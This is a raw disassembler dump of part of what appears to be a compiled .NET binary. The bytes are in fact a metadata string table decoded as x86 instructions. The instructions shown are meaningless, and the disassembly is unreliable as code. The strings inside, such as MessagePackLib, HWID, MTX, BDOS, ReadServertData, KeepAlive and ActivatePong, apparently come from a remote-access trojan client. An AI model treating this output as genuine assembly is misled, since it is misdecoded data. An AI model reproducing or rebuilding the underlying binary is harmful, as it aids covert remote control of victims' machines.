  4076f7:	00 03                	add    %al,(%ebx)
  4076f9:	00 16                	add    %dl,(%esi)
  4076fb:	00 c2                	add    %al,%dl
  4076fd:	00 05 00 16 00 c4    	add    %al,0xc4001600
  407703:	00 07                	add    %al,(%edi)
  407705:	00 18                	add    %bl,(%eax)
  407707:	00 26                	add    %ah,(%esi)
  407709:	01 09                	add    %ecx,(%ecx)
  40770b:	00 2a                	add    %ch,(%edx)
  40770d:	0f 1d 0f             	nopl   (%edi)
  407710:	35 0f ef 05 5b       	xor    $0x5b05ef0f,%eax
  407715:	06                   	push   %es
  407716:	75 06                	jne    0x40771e
  407718:	9c                   	pushf
  407719:	06                   	push   %es
  40771a:	ff 06                	incl   (%esi)
  40771c:	27                   	daa
  40771d:	07                   	pop    %es
  40771e:	00 01                	add    %al,(%ecx)
  407720:	71 00                	jno    0x407722
  407722:	08 1c 01             	or     %bl,(%ecx,%eax,1)
  407725:	00 00                	add    %al,(%eax)
  407727:	01 73 00             	add    %esi,0x0(%ebx)
  40772a:	f3 1b 01             	repz sbb (%ecx),%eax
  40772d:	00 00                	add    %al,(%eax)
  40772f:	01 75 00             	add    %esi,0x0(%ebp)
  407732:	f0 05 02 00 41 01    	lock add $0x1410002,%eax
  407738:	77 00                	ja     0x40773a
  40773a:	09 1b                	or     %ebx,(%ebx)
  40773c:	02 00                	add    (%eax),%al
  40773e:	40                   	inc    %eax
  40773f:	01 79 00             	add    %edi,0x0(%ecx)
  407742:	c4 08                	les    (%eax),%ecx
  407744:	02 00                	add    (%eax),%al
  407746:	40                   	inc    %eax
  407747:	01 7b 00             	add    %edi,0x0(%ebx)
  40774a:	86 0e                	xchg   %cl,(%esi)
  40774c:	03 00                	add    (%eax),%eax
  40774e:	50                   	push   %eax
  40774f:	20 00                	and    %al,(%eax)
  407751:	00 2d 00 70 20 00    	add    %ch,0x207000
  407757:	00 47 00             	add    %al,0x0(%edi)
  40775a:	04 80                	add    $0x80,%al
  40775c:	00 00                	add    %al,(%eax)
  40775e:	01 00                	add    %eax,(%eax)
	...
  40776c:	9b                   	fwait
  40776d:	00 00                	add    %al,(%eax)
  40776f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40777a:	00 00                	add    %al,(%eax)
  40777c:	01 00                	add    %eax,(%eax)
  40777e:	c2 02 00             	ret    $0x2
  407781:	00 00                	add    %al,(%eax)
  407783:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40778e:	00 00                	add    %al,(%eax)
  407790:	01 00                	add    %eax,(%eax)
  407792:	f6 0f 00             	testb  $0x0,(%edi)
  407795:	00 00                	add    %al,(%eax)
  407797:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077a2:	00 00                	add    %al,(%eax)
  4077a4:	cc                   	int3
  4077a5:	00 dc                	add    %bl,%ah
  4077a7:	0c 00                	or     $0x0,%al
  4077a9:	00 00                	add    %al,(%eax)
  4077ab:	00 04 00             	add    %al,(%eax,%eax,1)
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	00 00                	add    %al,(%eax)
  4077b2:	00 00                	add    %al,(%eax)
  4077b4:	70 00                	jo     0x4077b6
  4077b6:	00 00                	add    %al,(%eax)
  4077b8:	01 00                	add    %eax,(%eax)
  4077ba:	4c                   	dec    %esp
  4077bb:	08 00                	or     %al,(%eax)
  4077bd:	00 00                	add    %al,(%eax)
  4077bf:	00 0a                	add    %cl,(%edx)
	...
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 cc                	add    %cl,%ah
  4077cd:	00 e6                	add    %ah,%dh
  4077cf:	02 00                	add    (%eax),%al
  4077d1:	00 00                	add    %al,(%eax)
  4077d3:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077de:	00 00                	add    %al,(%eax)
  4077e0:	cc                   	int3
  4077e1:	00 87 1a 00 00 00    	add    %al,0x1a(%edi)
  4077e7:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	01 00                	add    %eax,(%eax)
  4077f6:	ae                   	scas   %es:(%edi),%al
  4077f7:	17                   	pop    %ss
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	04 00                	add    $0x0,%al
  4077fe:	00 00                	add    %al,(%eax)
  407800:	00 00                	add    %al,(%eax)
  407802:	00 00                	add    %al,(%eax)
  407804:	70 00                	jo     0x407806
  407806:	00 00                	add    %al,(%eax)
  407808:	cc                   	int3
  407809:	00 9d 12 00 00 00    	add    %bl,0x12(%ebp)
  40780f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407812:	0b 00                	or     (%eax),%eax
  407814:	10 00                	adc    %al,(%eax)
  407816:	0f 00 14 00          	lldt   (%eax,%eax,1)
  40781a:	13 00                	adc    (%eax),%eax
  40781c:	1e                   	push   %ds
  40781d:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  407823:	06                   	push   %es
  407824:	00 41 63             	add    %al,0x63(%ecx)
  407827:	74 69                	je     0x407892
  407829:	6f                   	outsl  %ds:(%esi),(%dx)
  40782a:	6e                   	outsb  %ds:(%esi),(%dx)
  40782b:	60                   	pusha
  40782c:	31 30                	xor    %esi,(%eax)
  40782e:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407831:	70 5f                	jo     0x407892
  407833:	5f                   	pop    %edi
  407834:	30 00                	xor    %al,(%eax)
  407836:	49                   	dec    %ecx
  407837:	45                   	inc    %ebp
  407838:	6e                   	outsb  %ds:(%esi),(%dx)
  407839:	75 6d                	jne    0x4078a8
  40783b:	65 72 61             	gs jb  0x40789f
  40783e:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407842:	31 00                	xor    %eax,(%eax)
  407844:	43                   	inc    %ebx
  407845:	61                   	popa
  407846:	6c                   	insb   (%dx),%es:(%edi)
  407847:	6c                   	insb   (%dx),%es:(%edi)
  407848:	53                   	push   %ebx
  407849:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407850:	69 
  407851:	73 74                	jae    0x4078c7
  407853:	60                   	pusha
  407854:	31 00                	xor    %eax,(%eax)
  407856:	61                   	popa
  407857:	31 00                	xor    %eax,(%eax)
  407859:	76 31                	jbe    0x40788c
  40785b:	00 5f 5f             	add    %bl,0x5f(%edi)
  40785e:	53                   	push   %ebx
  40785f:	74 61                	je     0x4078c2
  407861:	74 69                	je     0x4078cc
  407863:	63 41 72             	arpl   %eax,0x72(%ecx)
  407866:	72 61                	jb     0x4078c9
  407868:	79 49                	jns    0x4078b3
  40786a:	6e                   	outsb  %ds:(%esi),(%dx)
  40786b:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  407872:	69 
  407873:	7a 65                	jp     0x4078da
  407875:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  40787a:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407881:	74 2e                	je     0x4078b1
  407883:	57                   	push   %edi
  407884:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  40788b:	55                   	push   %ebp
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 33                	je     0x4078c3
  407890:	32 00                	xor    (%eax),%al
  407892:	54                   	push   %esp
  407893:	6f                   	outsl  %ds:(%esi),(%dx)
  407894:	49                   	dec    %ecx
  407895:	6e                   	outsb  %ds:(%esi),(%dx)
  407896:	74 33                	je     0x4078cb
  407898:	32 00                	xor    (%eax),%al
  40789a:	53                   	push   %ebx
  40789b:	77 61                	ja     0x4078fe
  40789d:	70 49                	jo     0x4078e8
  40789f:	6e                   	outsb  %ds:(%esi),(%dx)
  4078a0:	74 33                	je     0x4078d5
  4078a2:	32 00                	xor    (%eax),%al
  4078a4:	3c 3e                	cmp    $0x3e,%al
  4078a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4078a7:	5f                   	pop    %edi
  4078a8:	5f                   	pop    %edi
  4078a9:	32 00                	xor    (%eax),%al
  4078ab:	61                   	popa
  4078ac:	32 00                	xor    (%eax),%al
  4078ae:	58                   	pop    %eax
  4078af:	35 30 39 43 65       	xor    $0x65433930,%eax
  4078b4:	72 74                	jb     0x40792a
  4078b6:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4078bd:	32 00                	xor    (%eax),%al
  4078bf:	37                   	aaa
  4078c0:	7a 69                	jp     0x40792b
  4078c2:	70 2d                	jo     0x4078f1
  4078c4:	76 65                	jbe    0x40792b
  4078c6:	72 32                	jb     0x4078fa
  4078c8:	00 76 32             	add    %dh,0x32(%esi)
  4078cb:	00 76 33             	add    %dh,0x33(%esi)
  4078ce:	00 57 72             	add    %dl,0x72(%edi)
  4078d1:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  4078d8:	36 
  4078d9:	34 00                	xor    $0x0,%al
  4078db:	54                   	push   %esp
  4078dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4078dd:	55                   	push   %ebp
  4078de:	49                   	dec    %ecx
  4078df:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e0:	74 36                	je     0x407918
  4078e2:	34 00                	xor    $0x0,%al
  4078e4:	47                   	inc    %edi
  4078e5:	65 74 41             	gs je  0x407929
  4078e8:	73 55                	jae    0x40793f
  4078ea:	49                   	dec    %ecx
  4078eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ec:	74 36                	je     0x407924
  4078ee:	34 00                	xor    $0x0,%al
  4078f0:	53                   	push   %ebx
  4078f1:	65 74 41             	gs je  0x407935
  4078f4:	73 55                	jae    0x40794b
  4078f6:	49                   	dec    %ecx
  4078f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f8:	74 36                	je     0x407930
  4078fa:	34 00                	xor    $0x0,%al
  4078fc:	54                   	push   %esp
  4078fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4078fe:	49                   	dec    %ecx
  4078ff:	6e                   	outsb  %ds:(%esi),(%dx)
  407900:	74 36                	je     0x407938
  407902:	34 00                	xor    $0x0,%al
  407904:	53                   	push   %ebx
  407905:	77 61                	ja     0x407968
  407907:	70 49                	jo     0x407952
  407909:	6e                   	outsb  %ds:(%esi),(%dx)
  40790a:	74 36                	je     0x407942
  40790c:	34 00                	xor    $0x0,%al
  40790e:	54                   	push   %esp
  40790f:	6f                   	outsl  %ds:(%esi),(%dx)
  407910:	55                   	push   %ebp
  407911:	49                   	dec    %ecx
  407912:	6e                   	outsb  %ds:(%esi),(%dx)
  407913:	74 31                	je     0x407946
  407915:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  40791a:	6e                   	outsb  %ds:(%esi),(%dx)
  40791b:	74 31                	je     0x40794e
  40791d:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  407921:	61                   	popa
  407922:	70 49                	jo     0x40796d
  407924:	6e                   	outsb  %ds:(%esi),(%dx)
  407925:	74 31                	je     0x407958
  407927:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  40792b:	41                   	inc    %ecx
  40792c:	43                   	inc    %ebx
  40792d:	53                   	push   %ebx
  40792e:	48                   	dec    %eax
  40792f:	41                   	inc    %ecx
  407930:	32 35 36 00 53 68    	xor    0x68530036,%dh
  407936:	61                   	popa
  407937:	32 35 36 00 41 65    	xor    0x65410036,%dh
  40793d:	73 32                	jae    0x407971
  40793f:	35 36 00 61 65       	xor    $0x65610036,%eax
  407944:	73 32                	jae    0x407978
  407946:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  40794b:	53                   	push   %ebx
  40794c:	74 61                	je     0x4079af
  40794e:	74 69                	je     0x4079b9
  407950:	63 41 72             	arpl   %eax,0x72(%ecx)
  407953:	72 61                	jb     0x4079b6
  407955:	79 49                	jns    0x4079a0
  407957:	6e                   	outsb  %ds:(%esi),(%dx)
  407958:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40795f:	69 
  407960:	7a 65                	jp     0x4079c7
  407962:	3d 36 00 67 65       	cmp    $0x65670036,%eax
  407967:	74 5f                	je     0x4079c8
  407969:	55                   	push   %ebp
  40796a:	54                   	push   %esp
  40796b:	46                   	inc    %esi
  40796c:	38 00                	cmp    %al,(%eax)
  40796e:	3c 4d                	cmp    $0x4d,%al
  407970:	6f                   	outsl  %ds:(%esi),(%dx)
  407971:	64 75 6c             	fs jne 0x4079e0
  407974:	65 3e 00 4d 65       	gs add %cl,%ds:0x65(%ebp)
  407979:	73 73                	jae    0x4079ee
  40797b:	61                   	popa
  40797c:	67 65 50             	addr16 gs push %eax
  40797f:	61                   	popa
  407980:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  407983:	69 62 2e 3c 50 72 69 	imul   $0x6972503c,0x2e(%edx),%esp
  40798a:	76 61                	jbe    0x4079ed
  40798c:	74 65                	je     0x4079f3
  40798e:	49                   	dec    %ecx
  40798f:	6d                   	insl   (%dx),%es:(%edi)
  407990:	70 6c                	jo     0x4079fe
  407992:	65 6d                	gs insl (%dx),%es:(%edi)
  407994:	65 6e                	outsb  %gs:(%esi),(%dx)
  407996:	74 61                	je     0x4079f9
  407998:	74 69                	je     0x407a03
  40799a:	6f                   	outsl  %ds:(%esi),(%dx)
  40799b:	6e                   	outsb  %ds:(%esi),(%dx)
  40799c:	44                   	inc    %esp
  40799d:	65 74 61             	gs je  0x407a01
  4079a0:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  4079a7:	42 
  4079a8:	32 41 31             	xor    0x31(%ecx),%al
  4079ab:	46                   	inc    %esi
  4079ac:	39 39                	cmp    %edi,(%ecx)
  4079ae:	30 32                	xor    %dh,(%edx)
  4079b0:	42                   	inc    %edx
  4079b1:	33 35 46 38 46 38    	xor    0x38463846,%esi
  4079b7:	38 30                	cmp    %dh,(%eax)
  4079b9:	45                   	inc    %ebp
  4079ba:	46                   	inc    %esi
  4079bb:	31 36                	xor    %esi,(%esi)
  4079bd:	39 32                	cmp    %esi,(%edx)
  4079bf:	43                   	inc    %ebx
  4079c0:	45                   	inc    %ebp
  4079c1:	39 39                	cmp    %edi,(%ecx)
  4079c3:	34 37                	xor    $0x37,%al
  4079c5:	41                   	inc    %ecx
  4079c6:	31 39                	xor    %edi,(%ecx)
  4079c8:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  4079cc:	36 39 38             	cmp    %edi,%ss:(%eax)
  4079cf:	44                   	inc    %esp
  4079d0:	38 46 35             	cmp    %al,0x35(%esi)
  4079d3:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  4079d7:	41                   	inc    %ecx
  4079d8:	37                   	aaa
  4079d9:	32 31                	xor    (%ecx),%dh
  4079db:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4079e1:	43                   	inc    %ebx
  4079e2:	35 38 42 00 47       	xor    $0x47004238,%eax
  4079e7:	43                   	inc    %ebx
  4079e8:	00 45 53             	add    %al,0x53(%ebp)
  4079eb:	5f                   	pop    %edi
  4079ec:	53                   	push   %ebx
  4079ed:	59                   	pop    %ecx
  4079ee:	53                   	push   %ebx
  4079ef:	54                   	push   %esp
  4079f0:	45                   	inc    %ebp
  4079f1:	4d                   	dec    %ebp
  4079f2:	5f                   	pop    %edi
  4079f3:	52                   	push   %edx
  4079f4:	45                   	inc    %ebp
  4079f5:	51                   	push   %ecx
  4079f6:	55                   	push   %ebp
  4079f7:	49                   	dec    %ecx
  4079f8:	52                   	push   %edx
  4079f9:	45                   	inc    %ebp
  4079fa:	44                   	inc    %esp
  4079fb:	00 45 53             	add    %al,0x53(%ebp)
  4079fe:	5f                   	pop    %edi
  4079ff:	44                   	inc    %esp
  407a00:	49                   	dec    %ecx
  407a01:	53                   	push   %ebx
  407a02:	50                   	push   %eax
  407a03:	4c                   	dec    %esp
  407a04:	41                   	inc    %ecx
  407a05:	59                   	pop    %ecx
  407a06:	5f                   	pop    %edi
  407a07:	52                   	push   %edx
  407a08:	45                   	inc    %ebp
  407a09:	51                   	push   %ecx
  407a0a:	55                   	push   %ebp
  407a0b:	49                   	dec    %ecx
  407a0c:	52                   	push   %edx
  407a0d:	45                   	inc    %ebp
  407a0e:	44                   	inc    %esp
  407a0f:	00 4d 61             	add    %cl,0x61(%ebp)
  407a12:	70 4e                	jo     0x407a62
  407a14:	61                   	popa
  407a15:	6d                   	insl   (%dx),%es:(%edi)
  407a16:	65 54                	gs push %esp
  407a18:	6f                   	outsl  %ds:(%esi),(%dx)
  407a19:	4f                   	dec    %edi
  407a1a:	49                   	dec    %ecx
  407a1b:	44                   	inc    %esp
  407a1c:	00 48 57             	add    %cl,0x57(%eax)
  407a1f:	49                   	dec    %ecx
  407a20:	44                   	inc    %esp
  407a21:	00 67 65             	add    %ah,0x65(%edi)
  407a24:	74 5f                	je     0x407a85
  407a26:	46                   	inc    %esi
  407a27:	6f                   	outsl  %ds:(%esi),(%dx)
  407a28:	72 6d                	jb     0x407a97
  407a2a:	61                   	popa
  407a2b:	74 49                	je     0x407a76
  407a2d:	44                   	inc    %esp
  407a2e:	00 45 58             	add    %al,0x58(%ebp)
  407a31:	45                   	inc    %ebp
  407a32:	43                   	inc    %ebx
  407a33:	55                   	push   %ebp
  407a34:	54                   	push   %esp
  407a35:	49                   	dec    %ecx
  407a36:	4f                   	dec    %edi
  407a37:	4e                   	dec    %esi
  407a38:	5f                   	pop    %edi
  407a39:	53                   	push   %ebx
  407a3a:	54                   	push   %esp
  407a3b:	41                   	inc    %ecx
  407a3c:	54                   	push   %esp
  407a3d:	45                   	inc    %ebp
  407a3e:	00 38                	add    %bh,(%eax)
  407a40:	37                   	aaa
  407a41:	36 33 39             	xor    %ss:(%ecx),%edi
  407a44:	31 32                	xor    %esi,(%edx)
  407a46:	36 45                	ss inc %ebp
  407a48:	41                   	inc    %ecx
  407a49:	37                   	aaa
  407a4a:	37                   	aaa
  407a4b:	42                   	inc    %edx
  407a4c:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407a52:	35 33 32 33 36       	xor    $0x36333233,%eax
  407a57:	37                   	aaa
  407a58:	44                   	inc    %esp
  407a59:	42                   	inc    %edx
  407a5a:	41                   	inc    %ecx
  407a5b:	36 37                	ss aaa
  407a5d:	43                   	inc    %ebx
  407a5e:	35 33 31 30 45       	xor    $0x45303133,%eax
  407a63:	46                   	inc    %esi
  407a64:	35 30 41 38 44       	xor    $0x44384130,%eax
  407a69:	39 38                	cmp    %edi,(%eax)
  407a6b:	38 38                	cmp    %bh,(%eax)
  407a6d:	45                   	inc    %ebp
  407a6e:	44                   	inc    %esp
  407a6f:	30 37                	xor    %dh,(%edi)
  407a71:	30 43 44             	xor    %al,0x44(%ebx)
  407a74:	34 30                	xor    $0x30,%al
  407a76:	45                   	inc    %ebp
  407a77:	31 46 36             	xor    %eax,0x36(%esi)
  407a7a:	30 35 41 38 46 00    	xor    %dh,0x463841
  407a80:	67 65 74 5f          	addr16 gs je 0x407ae3
  407a84:	41                   	inc    %ecx
  407a85:	53                   	push   %ebx
  407a86:	43                   	inc    %ebx
  407a87:	49                   	dec    %ecx
  407a88:	49                   	dec    %ecx
  407a89:	00 53 79             	add    %dl,0x79(%ebx)
  407a8c:	73 74                	jae    0x407b02
  407a8e:	65 6d                	gs insl (%dx),%es:(%edi)
  407a90:	2e 49                	cs dec %ecx
  407a92:	4f                   	dec    %edi
  407a93:	00 49 73             	add    %cl,0x73(%ecx)
  407a96:	58                   	pop    %eax
  407a97:	50                   	push   %eax
  407a98:	00 42 44             	add    %al,0x44(%edx)
  407a9b:	4f                   	dec    %edi
  407a9c:	53                   	push   %ebx
  407a9d:	00 45 53             	add    %al,0x53(%ebp)
  407aa0:	5f                   	pop    %edi
  407aa1:	43                   	inc    %ebx
  407aa2:	4f                   	dec    %edi
  407aa3:	4e                   	dec    %esi
  407aa4:	54                   	push   %esp
  407aa5:	49                   	dec    %ecx
  407aa6:	4e                   	dec    %esi
  407aa7:	55                   	push   %ebp
  407aa8:	4f                   	dec    %edi
  407aa9:	55                   	push   %ebp
  407aaa:	53                   	push   %ebx
  407aab:	00 67 65             	add    %ah,0x65(%edi)
  407aae:	74 5f                	je     0x407b0f
  407ab0:	49                   	dec    %ecx
  407ab1:	56                   	push   %esi
  407ab2:	00 73 65             	add    %dh,0x65(%ebx)
  407ab5:	74 5f                	je     0x407b16
  407ab7:	49                   	dec    %ecx
  407ab8:	56                   	push   %esi
  407ab9:	00 47 65             	add    %al,0x65(%edi)
  407abc:	6e                   	outsb  %ds:(%esi),(%dx)
  407abd:	65 72 61             	gs jb  0x407b21
  407ac0:	74 65                	je     0x407b27
  407ac2:	49                   	dec    %ecx
  407ac3:	56                   	push   %esi
  407ac4:	00 4d 54             	add    %cl,0x54(%ebp)
  407ac7:	58                   	pop    %eax
  407ac8:	00 76 61             	add    %dh,0x61(%esi)
  407acb:	6c                   	insb   (%dx),%es:(%edi)
  407acc:	75 65                	jne    0x407b33
  407ace:	5f                   	pop    %edi
  407acf:	5f                   	pop    %edi
  407ad0:	00 52 65             	add    %dl,0x65(%edx)
  407ad3:	61                   	popa
  407ad4:	64 53                	fs push %ebx
  407ad6:	65 72 76             	gs jb  0x407b4f
  407ad9:	65 72 74             	gs jb  0x407b50
  407adc:	44                   	inc    %esp
  407add:	61                   	popa
  407ade:	74 61                	je     0x407b41
  407ae0:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  407ae4:	61                   	popa
  407ae5:	00 6d 73             	add    %ch,0x73(%ebp)
  407ae8:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407aeb:	6c                   	insb   (%dx),%es:(%edi)
  407aec:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  407af3:	65 6d                	gs insl (%dx),%es:(%edi)
  407af5:	2e 43                	cs inc %ebx
  407af7:	6f                   	outsl  %ds:(%esi),(%dx)
  407af8:	6c                   	insb   (%dx),%es:(%edi)
  407af9:	6c                   	insb   (%dx),%es:(%edi)
  407afa:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407aff:	6e                   	outsb  %ds:(%esi),(%dx)
  407b00:	73 2e                	jae    0x407b30
  407b02:	47                   	inc    %edi
  407b03:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b05:	65 72 69             	gs jb  0x407b71
  407b08:	63 00                	arpl   %eax,(%eax)
  407b0a:	4d                   	dec    %ebp
  407b0b:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407b12:	74 2e                	je     0x407b42
  407b14:	56                   	push   %esi
  407b15:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407b1c:	73 69                	jae    0x407b87
  407b1e:	63 00                	arpl   %eax,(%eax)
  407b20:	67 65 74 5f          	addr16 gs je 0x407b83
  407b24:	53                   	push   %ebx
  407b25:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b27:	64 53                	fs push %ebx
  407b29:	79 6e                	jns    0x407b99
  407b2b:	63 00                	arpl   %eax,(%eax)
  407b2d:	45                   	inc    %ebp
  407b2e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b2f:	64 52                	fs push %edx
  407b31:	65 61                	gs popa
  407b33:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  407b37:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407b3e:	00 
  407b3f:	54                   	push   %esp
  407b40:	68 72 65 61 64       	push   $0x64616572
  407b45:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  407b49:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407b4d:	6e                   	outsb  %ds:(%esi),(%dx)
  407b4e:	65 72 41             	gs jb  0x407b92
  407b51:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407b56:	41                   	inc    %ecx
  407b57:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  407b5d:	61                   	popa
  407b5e:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407b64:	74 5f                	je     0x407bc5
  407b66:	43                   	inc    %ebx
  407b67:	6f                   	outsl  %ds:(%esi),(%dx)
  407b68:	6e                   	outsb  %ds:(%esi),(%dx)
  407b69:	6e                   	outsb  %ds:(%esi),(%dx)
  407b6a:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b6f:	00 67 65             	add    %ah,0x65(%edi)
  407b72:	74 5f                	je     0x407bd3
  407b74:	49                   	dec    %ecx
  407b75:	73 43                	jae    0x407bba
  407b77:	6f                   	outsl  %ds:(%esi),(%dx)
  407b78:	6e                   	outsb  %ds:(%esi),(%dx)
  407b79:	6e                   	outsb  %ds:(%esi),(%dx)
  407b7a:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b7f:	00 73 65             	add    %dh,0x65(%ebx)
  407b82:	74 5f                	je     0x407be3
  407b84:	49                   	dec    %ecx
  407b85:	73 43                	jae    0x407bca
  407b87:	6f                   	outsl  %ds:(%esi),(%dx)
  407b88:	6e                   	outsb  %ds:(%esi),(%dx)
  407b89:	6e                   	outsb  %ds:(%esi),(%dx)
  407b8a:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b8f:	00 52 65             	add    %dl,0x65(%edx)
  407b92:	63 65 69             	arpl   %esp,0x69(%ebp)
  407b95:	76 65                	jbe    0x407bfc
  407b97:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407b9b:	74 5f                	je     0x407bfc
  407b9d:	47                   	inc    %edi
  407b9e:	75 69                	jne    0x407c09
  407ba0:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407ba4:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  407bab:	64 
  407bac:	53                   	push   %ebx
  407bad:	79 6e                	jns    0x407c1d
  407baf:	63 3e                	arpl   %edi,(%esi)
  407bb1:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407bb5:	61                   	popa
  407bb6:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bb9:	6e                   	outsb  %ds:(%esi),(%dx)
  407bba:	67 46                	addr16 inc %esi
  407bbc:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407bc3:	73 43                	jae    0x407c08
  407bc5:	6f                   	outsl  %ds:(%esi),(%dx)
  407bc6:	6e                   	outsb  %ds:(%esi),(%dx)
  407bc7:	6e                   	outsb  %ds:(%esi),(%dx)
  407bc8:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407bcd:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407bd2:	61                   	popa
  407bd3:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bd6:	6e                   	outsb  %ds:(%esi),(%dx)
  407bd7:	67 46                	addr16 inc %esi
  407bd9:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  407be0:	65 65 70 41          	gs gs jo 0x407c25
  407be4:	6c                   	insb   (%dx),%es:(%edi)
  407be5:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  407bec:	42                   	inc    %edx
  407bed:	61                   	popa
  407bee:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bf1:	6e                   	outsb  %ds:(%esi),(%dx)
  407bf2:	67 46                	addr16 inc %esi
  407bf4:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  407bfb:	65 61                	gs popa
  407bfd:	64 65 72 53          	fs gs jb 0x407c54
  407c01:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  407c08:	42                   	inc    %edx
  407c09:	61                   	popa
  407c0a:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c0d:	6e                   	outsb  %ds:(%esi),(%dx)
  407c0e:	67 46                	addr16 inc %esi
  407c10:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  407c17:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  407c1e:	42                   	inc    %edx
  407c1f:	61                   	popa
  407c20:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c23:	6e                   	outsb  %ds:(%esi),(%dx)
  407c24:	67 46                	addr16 inc %esi
  407c26:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  407c2d:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407c31:	61                   	popa
  407c32:	74 65                	je     0x407c99
  407c34:	50                   	push   %eax
  407c35:	6f                   	outsl  %ds:(%esi),(%dx)
  407c36:	6e                   	outsb  %ds:(%esi),(%dx)
  407c37:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  407c3d:	61                   	popa
  407c3e:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c41:	6e                   	outsb  %ds:(%esi),(%dx)
  407c42:	67 46                	addr16 inc %esi
  407c44:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407c4b:	6e                   	outsb  %ds:(%esi),(%dx)
  407c4c:	74 65                	je     0x407cb3
  407c4e:	72 76                	jb     0x407cc6
  407c50:	61                   	popa
  407c51:	6c                   	insb   (%dx),%es:(%edi)
  407c52:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407c57:	61                   	popa
